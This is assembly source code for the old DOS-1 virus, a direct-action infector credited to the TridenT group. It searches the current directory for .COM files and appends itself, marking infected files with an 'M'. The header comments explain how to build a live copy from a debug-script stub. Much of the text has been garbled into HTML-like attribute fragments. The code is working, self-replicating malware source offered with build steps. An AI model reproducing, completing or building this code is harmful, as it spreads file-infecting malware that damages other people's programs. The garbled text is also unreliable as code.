﻿

;DOS1 virus by the TridenT research group - Direct Action appending .COM

;This virus infects .COM files in the current directory using FCB's.
;Other than FCB use, the virus is VERY simple.  Avoids infecting misnamed
;EXE files by using an 'M' at the beginning of files to mark infection.

;This virus requires a stub file made from the following debug script,
;to make it, compile the virus, then create the stub file by removing the
;semicolons from the code between the lines, saving it, and calling it
;vstub.hex.  Then use the following commands:

;               Debug <vstub.hex ;="" copy="" vstub.com+dos1.com="" virus.com="" ;and="" you="" will="" have="" a="" live="" copy="" of="" the="" dos-1="" virus.="" please="" be="" careful="" ;with="" it="" and="" do="" not="" release="" it.="" ;-="-=-=-=-=-=-=-=-=-=-=-=-=ð[Begin" debug="" script]ð="-=-=-=-=-=-=-=-=-=-=-=-=" ;e100="" 4d="" eb="" 6="" 90="" 90="" ;rbx="" ;0="" ;rcx="" ;5="" ;nvstub.com="" ;w="" ;q="" ;-="-=-=-=-=-=-=-=-=-=-=-=-=ð[End" debug="" script]ð="-=-=-=-=-=-=-=-=-=-=-=-=" ;disassembly="" by="" black="" wolf="" .model="" tiny="" .code="" org="" 100h="" start:="" dec="" bp="" nop="" int="" 20h="" hostfile:="" ;not="" present="" to="" preserve="" original="" compiler="" offsets.....="" virus_entry:="" call="" getoffset="" displacement:="" db="" 'dos-1',0="" getoffset:="" pop="" si="" sub="" si,offset="" displacement-start="" cld="" mov="" di,100h="" push="" di="" ;push="" di="" on="" stack="" for="" ret...="" push="" si="" ;restore="" host="" file...="" movsw="" movsw="" pop="" si="" lea="" dx,[si+virusdta-start]="" ;set="" ds:dx="DTA" call="" setdta="" mov="" ax,1100h="" ;find="" first="" filename="" w/fcb's="" findfirstnext:="" lea="" dx,[si+searchstring-start]="" int="" 21h="" ;find="" first/next="" filename="" ;using="" fcb's="" (*.com)="" or="" al,al="" ;were="" any="" .com="" files="" found?="" jnz="" resetdta="" ;no....="" exit="" virus.="" lea="" dx,[si+virusdta-start]="" mov="" ah,0fh="" int="" 21h="" ;open="" .com="" file="" w/fcb="" or="" al,al="" ;successful?="" jnz="" findnextfile="" ;no="" -="" find="" another.="" push="" dx="" ;push="" offset="" of="" dta="" mov="" di,dx="" mov="" word="" ptr="" [di+0eh],1="" ;set="" bytes="" per="" record="" to="" 1="" xor="" ax,ax="" mov="" [di+21h],ax="" ;set="" random="" record="" num="" to="" 0="" mov="" [di+23h],ax="" ;?="" lea="" dx,[si]="" call="" setdta="" ;set="" dta="" to="" just="" before="" virus="" ;code="" in="" memory="" -="" storage="" bytes..="" lea="" dx,[di]="" ;dx="Virus" dta="" mov="" ah,27h="" mov="" cx,4="" int="" 21h="" ;read="" first="" 4="" bytes="" w/fcb="" cmp="" byte="" ptr="" [si],'m'="" ;is="" it="" an="" exe="" file="" or="" infected?="" je="" closefile="" ;exit...="" mov="" ax,[di+10h]="" ;ax="Filesize" mov="" [di+21h],ax="" ;set="" current="" record="" to="" eof="" cmp="" ax,0f800h="" ;is="" file="" above="" f800h="" bytes?="" ja="" closefile="" ;too="" large,="" exit="" push="" ax="" lea="" dx,[si]="" call="" setdta="" ;set="" dta="" to="" storage="" bytes/virus.="" lea="" dx,[di]="" mov="" ah,28h="" mov="" cx,end_virus-start="" int="" 21h="" ;write="" virus="" to="" end="" of="" file.="" xor="" ax,ax="" mov="" [di+21h],ax="" ;reset="" file="" to="" beginning.="" lea="" di,[si]="" ;point="" di="" to="" dta="" mov="" ax,0e94dh="" ;4dh="" e9h="marker" and="" jump="" stosw="" pop="" ax="" ;ax="jump" size="" stosw="" ;put="" marker="" and="" jump="" into="" dta="" push="" dx="" lea="" dx,[si]="" call="" setdta="" ;set="" dta="" for="" write="" pop="" dx="" mov="" ah,28h="" mov="" cx,4="" int="" 21h="" ;write="" in="" id="" byte="" 'm'="" and="" jump="" closefile:="" pop="" dx="" call="" setdta="" mov="" ah,10h="" int="" 21h="" ;close="" file="" w/fcb="" findnextfile:="" mov="" ah,12h="" jmp="" short="" findfirstnext="" ;find="" next="" file...="" resetdta:="" mov="" dx,80h="" ;80h="default" dta="" call="" setdta="" retn="" setdta:="" mov="" ah,1ah="" int="" 21h="" ;set="" dta="" to="" ds:dx="" retn="" db="" 'mk'="" ;musad="" khafir's="" signature="" searchstring:="" db="" 0="" ;default="" drive="" db="" '????????com'="" ;search="" for="" all="" .com="" files.="" end_virus:="" org="" 1d1h="" virusdta:="" end="" start=""></vstub.hex>